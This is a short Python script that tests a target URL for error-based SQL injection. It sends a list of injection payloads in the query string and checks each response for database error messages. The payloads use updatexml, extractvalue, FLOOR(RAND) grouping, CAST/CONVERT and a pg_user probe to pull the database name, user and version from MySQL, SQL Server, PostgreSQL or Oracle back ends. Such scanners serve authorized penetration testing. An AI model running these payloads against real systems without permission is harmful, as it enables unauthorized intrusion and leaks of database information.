import requests as req
from urllib.parse import urlparse

def error_based(url, payload):
    try:
        separator = '&' if '?' in url else '?'
        full_url = f"{url}{separator}{payload}"
        
        response = req.get(full_url, timeout=10)
        
        error_signatures = [
            "SQL syntax", "mysql_fetch", "MySQL server version",
            "ORA-", "native client", "unclosed quotation mark",
            "syntax error", "Warning: pg_", "unterminated quoted string",
            "Invalid column name", "Microsoft OLE DB Provider for SQL Server",
            "invalid number", "unexpected token", "division by zero"
        ]

        return any(signature in response.text for signature in error_signatures)

    except req.RequestException as e:
        print(f"[!] Request failed: {e}")
        return False

def error_based_sql_injection(url):
    print("\n[+] Starting Error-Based SQL Injection Test...\n")
    
    payloads = [
        "id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)-- -",
        "id=1' AND updatexml(NULL, CONCAT(0x3a, (SELECT user())), NULL)-- -",
        "id=1' AND extractvalue(NULL, CONCAT(0x3a, (SELECT version())))-- -",
        "id=1' AND 1=CONVERT(int, (SELECT @@version))-- -",
        "id=1' AND 1=CAST((SELECT database()) AS INT)-- -",
        "id=1' AND 1=(SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x) a)-- -",
        "id=1' AND 1=(SELECT 1/0)-- -",
        "id=1' AND (SELECT CAST(version() AS INT))=1-- -",
        "id=1' AND (SELECT 1 FROM pg_catalog.pg_user WHERE substr(usename,1,1) = 'a')-- -",
        "id=1' AND (SELECT 1 FROM dual WHERE 1=1 AND LENGTH((SELECT database()))) > 0)-- -",
        "id=%27%20AND%20(SELECT%201%2F0)--%20"
    ]
    
    for payload in payloads:
        print(f"[*] Testing payload: {payload}")
        if error_based(url, payload):
            print(f"[!!] Vulnerability found with payload: {payload}\n")
            return True

    print("[x] No error-based SQL injection vulnerabilities found.\n")
    return False
